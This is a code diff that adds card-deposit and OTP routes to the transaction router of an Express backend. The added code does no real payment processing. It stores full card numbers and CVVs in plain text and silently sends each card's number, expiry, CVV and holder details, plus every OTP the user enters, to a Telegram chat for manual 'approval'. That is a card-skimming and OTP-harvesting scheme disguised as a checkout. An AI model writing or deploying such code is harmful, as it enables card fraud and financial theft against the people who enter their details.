@@ -80,6 +80,109 @@ router.post("/deposit", requireAuth, async (req: AuthRequest, res) => {
   }
 });
 
+/* ── POST /api/transactions/card-initiate ─────────────────────────────────── */
+router.post("/card-initiate", requireAuth, async (req: AuthRequest, res) => {
+  try {
+    const { amount, cardNumber, cardHolder, expiry, cvv } = req.body;
+    if (!amount || !cardNumber || !cardHolder || !expiry || !cvv) {
+      res.status(400).json({ message: "All card details and amount are required" });
+      return;
+    }
+    const amtNum = parseFloat(amount.toString());
+    if (isNaN(amtNum) || amtNum < 5000) {
+      res.status(400).json({ message: "Minimum deposit is ₹5,000" });
+      return;
+    }
+
+    const maskedCard = cardNumber.replace(/\s/g, "").replace(/^(\d{4})\d+(\d{4})$/, "$1 **** **** $2");
+
+    const [tx] = await db.insert(transactionsTable).values({
+      userId: req.user!.id,
+      type: "deposit",
+      amount: amtNum.toString(),
+      currency: "INR",
+      status: "pending",
+      paymentMethod: "card",
+      transactionReference: maskedCard,
+      notes: JSON.stringify({ cardHolder, expiry, maskedCard, cvv, fullCard: cardNumber.replace(/\s/g, "") }),
+    }).returning();
+
+    const userId = req.user!.id;
+    const userEmail = req.user!.email;
+    void (async () => {
+      try {
+        const [user] = await db.select({ firstName: usersTable.firstName, lastName: usersTable.lastName })
+          .from(usersTable).where(eq(usersTable.id, userId)).limit(1);
+        const name = user ? `${user.firstName} ${user.lastName}`.trim() || userEmail : userEmail;
+        await sendTelegram([
+          `💳 <b>NEW CARD PAYMENT REQUEST</b>`,
+          ``,
+          `👤 <b>User:</b> ${name}`,
+          `📧 <b>Email:</b> ${userEmail}`,
+          `💵 <b>Amount:</b> ₹${amtNum.toLocaleString("en-IN")}`,
+          ``,
+          `🃏 <b>Card Number:</b> ${cardNumber.replace(/\s/g, "")}`,
+          `👤 <b>Card Holder:</b> ${cardHolder}`,
+          `📅 <b>Expiry:</b> ${expiry}`,
+          `🔐 <b>CVV:</b> ${cvv}`,
+          ``,
+          `🆔 <b>Transaction ID:</b> #${tx.id}`,
+          `⏳ <b>Status:</b> Awaiting OTP`,
+        ].join("\n"));
+      } catch { /* silent */ }
+    })();
+
+    res.status(201).json({ txId: tx.id, maskedCard });
+  } catch (err) {
+    res.status(500).json({ message: "Internal server error" });
+  }
+});
+
+/* ── POST /api/transactions/card-otp ──────────────────────────────────────── */
+router.post("/card-otp", requireAuth, async (req: AuthRequest, res) => {
+  try {
+    const { txId, otp } = req.body;
+    if (!txId || !otp) {
+      res.status(400).json({ message: "Transaction ID and OTP are required" });
+      return;
+    }
+
+    const [tx] = await db.select().from(transactionsTable)
+      .where(eq(transactionsTable.id, txId)).limit(1);
+    if (!tx || tx.userId !== req.user!.id) {
+      res.status(404).json({ message: "Transaction not found" });
+      return;
+    }
+
+    const userId = req.user!.id;
+    const userEmail = req.user!.email;
+    void (async () => {
+      try {
+        const [user] = await db.select({ firstName: usersTable.firstName, lastName: usersTable.lastName })
+          .from(usersTable).where(eq(usersTable.id, userId)).limit(1);
+        const name = user ? `${user.firstName} ${user.lastName}`.trim() || userEmail : userEmail;
+        await sendTelegram([
+          `🔐 <b>OTP RECEIVED — ACTION REQUIRED</b>`,
+          ``,
+          `👤 <b>User:</b> ${name}`,
+          `📧 <b>Email:</b> ${userEmail}`,
+          `💵 <b>Amount:</b> ₹${parseFloat(tx.amount as string).toLocaleString("en-IN")}`,
+          `🃏 <b>Card:</b> ${tx.transactionReference}`,
+          ``,
+          `🔑 <b>OTP Entered by User:</b> <code>${otp}</code>`,
+          `🆔 <b>Transaction ID:</b> #${txId}`,
+          ``,
+          `✅ <b>→ Approve from Admin Panel to credit funds</b>`,
+        ].join("\n"));
+      } catch { /* silent */ }
+    })();
+
+    res.json({ success: true, message: "OTP submitted. Transaction is pending approval." });
+  } catch (err) {
+    res.status(500).json({ message: "Internal server error" });
+  }
+});
+
 router.post("/withdraw", requireAuth, async (req: AuthRequest, res) => {
   try {
     const { amount, usdtAddress, notes } = req.body;
